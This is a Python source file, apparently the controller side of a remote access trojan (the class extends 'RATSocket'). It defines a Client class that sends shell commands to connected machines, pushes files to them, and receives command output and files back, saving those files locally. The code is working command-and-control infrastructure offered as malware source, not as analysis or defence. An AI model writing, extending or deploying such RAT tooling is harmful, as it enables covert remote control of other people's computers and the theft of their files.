import ntpath
import os
import queue
import time
import uuid

from common.ratsocket import RATSocket
from common.util import get_output_stream, get_input_stream


class Client(RATSocket):

    def __init__(self, s, address=None, info=None):
        super().__init__()
        self.socket = s
        self.address = address
        self.id = str(uuid.uuid4())  # 客户端id
        self.info = info  # 客户端信息
        self.queue = queue.Queue()  # 存放未读消息
        self.status = False  # 是否正在交互

    def send_command(self, command: str) -> int:
        """
        向客户端发送命令
        :param command: 命令
        :return: 命令id
        """
        data = {
            'type': 'command',
            'id': int(time.time()),
            'text': command
        }
        self.send(data)
        return data['id']

    def send_file(self, id: int, filename: str):
        """
        向客户端发送文件
        :param id: 命令id
        :param filename: 文件名
        """
        data = {
            'type': 'file',
            'id': id,
            'length': os.stat(filename).st_size,
            'filename': ntpath.basename(filename)
        }
        self.send(data)
        status, _ = self.queue.get()
        if status:
            self.send_io(get_output_stream(filename))

    def recv_result(self) -> (int, int, str):
        """
        从客户端接收结果
        :return: 命令id，状态，结果
        """
        data = self.recv()
        type = data['type']
        # 如果是就绪信号
        if type == 'rdy':
            self.queue.put((data['status'], None))
            return
        id = data['id']
        self.info['cwd'] = data['cwd']
        # 如果是结果
        if type == 'result':
            return id, data['status'], data['text']
        # 如果是文件
        elif type == 'file':
            filename = os.path.abspath(data['filename'])
            try:
                io = get_input_stream(filename)
            except Exception as e:
                self.send_signal(0)
                return id, 0, f'Error opening local file: {e}'
            try:
                self.send_signal(1)
                self.recv_io(data['length'], io)
                return id, 1, f'File saved to: {filename}'
            except Exception as e:
                return id, 0, f'Error receiving file from {self.address}: {e}'
